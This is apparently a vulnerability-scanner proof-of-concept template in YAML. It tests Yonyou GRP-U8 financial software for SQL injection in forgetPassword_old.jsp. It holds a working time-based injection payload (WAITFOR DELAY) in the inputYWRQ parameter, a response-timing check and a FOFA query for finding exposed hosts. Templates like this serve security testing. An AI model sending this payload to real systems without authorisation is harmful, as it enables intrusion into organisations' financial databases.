id: poc-yaml-yongyou-grp-u8-forgetpassword-oldjsp-sqli
info:
  name: 用友GRP-U8 forgetPassword_old.jsp SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  - 两高一弱
  finger: 用友NC
  fofa: app="用友-GRP-U8"
variables:
  t1: random_int(5,8)
  t2: t1 + 1
requests:
- method: GET
  path: /u8qx/forgetPassword_old.jsp?action=save&idCard=1&userName=1&inputDW=1&inputYWRQ=1%27;WAITFOR%20DELAY%20%270:0:{{.t1}}%27--
  expression: 'status_code == 200 &&

    contains(body,"用友GRP-U8 行政财务管理软件-忘记密码") &&

    duration > t1 &&

    duration < t2

    '
transport: http
